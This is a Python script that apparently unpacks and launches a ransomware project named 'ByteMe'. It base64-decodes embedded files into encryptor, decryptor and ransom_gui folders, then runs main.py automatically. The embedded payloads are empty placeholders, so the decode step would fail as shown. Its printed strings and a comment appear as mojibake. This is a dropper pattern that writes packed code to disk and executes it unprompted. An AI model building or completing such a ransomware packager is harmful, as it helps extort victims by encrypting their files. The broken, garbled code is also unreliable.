import os
import base64
import subprocess
def rebuild_project():
    structure = {
        "encryptor": {"encrypt.py": "<>"},
        "decryptor": {"decrypt.py": "<>"},
        "gui": {"ransom_gui.py": "<>"},
        "utils": {"helpers.py": "<>"},
        "":{"main.py": "<>"
    }
}
    project_root = os.path.expanduser("~/ByteMeProject")
    byte_me_dir  = os.path.join(project_root, "ByteMe")
    os.makedirs(byte_me_dir, exist_ok=True)
    print(f"ðŸ“‚ Created folder: {byte_me_dir}")

    for folder, files in structure.items():
        folder_path = os.path.join(byte_me_dir, folder)
        os.makedirs(folder_path, exist_ok=True)
        for name, b64 in files.items():
            file_path = os.path.join(folder_path, name)
            with open(file_path, "w") as f:
                f.write(base64.b64decode(b64).decode("utf-8"))
            print(f"âœ… {os.path.relpath(file_path, project_root)}")

    # ×¢×›×©×™×• ×”×”×¨×¦×”: main.py ×‘×ª×•×š ByteMe
    main_path = os.path.join(byte_me_dir, "main.py")
    print(f"\nðŸš€ Running {main_path}\n")
    subprocess.run(["python3", main_path])

if __name__ == "__main__":
    rebuild_project()
